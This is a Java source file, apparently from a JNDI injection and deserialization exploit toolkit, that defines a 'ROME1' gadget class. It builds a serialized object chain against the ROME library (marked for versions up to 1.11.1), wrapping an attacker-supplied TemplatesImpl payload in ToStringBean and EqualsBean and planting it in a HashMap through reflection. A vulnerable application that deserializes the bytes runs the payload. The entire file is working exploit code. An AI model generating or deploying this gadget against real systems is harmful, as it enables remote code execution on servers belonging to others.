package sonomon.jndi.deser.gadgets;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Method;
import java.util.HashMap;
import javax.xml.transform.Templates;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class ROME1 implements SerializeObject{
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		TemplatesImpl obj = new TemplatesImpl();
		//ROME <= 1.11.1
        Object toStringBean = new ToStringBean(Templates.class,obj);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap hashMap = new HashMap<>();
        try {
            Deserialize.setFieldValue(hashMap, "modCount", 1);
            Method addEntry = HashMap.class.getDeclaredMethod("addEntry", new Class[]{int.class,Object.class,Object.class,int.class});
            addEntry.setAccessible(true);
            addEntry.invoke(hashMap, new Object[]{-2122412728,equalsBean,"123",8});
		} catch (Exception e) {
			try {
	            Method putVal = HashMap.class.getDeclaredMethod("putVal", new Class[]{int.class,Object.class,Object.class,boolean.class,boolean.class});
	            putVal.setAccessible(true);
	            putVal.invoke(hashMap, new Object[]{-1997974365,equalsBean,"123",false,true});
			} catch (Exception e2) {
				hashMap.put(equalsBean,"123");
			}
		}
        
        try {
        	Deserialize.setFieldValue(toStringBean, "obj", tempImpl);
		} catch (Exception e) {
			Deserialize.setFieldValue(toStringBean, "_obj", tempImpl);
		}
        
        return hashMap;
    }
}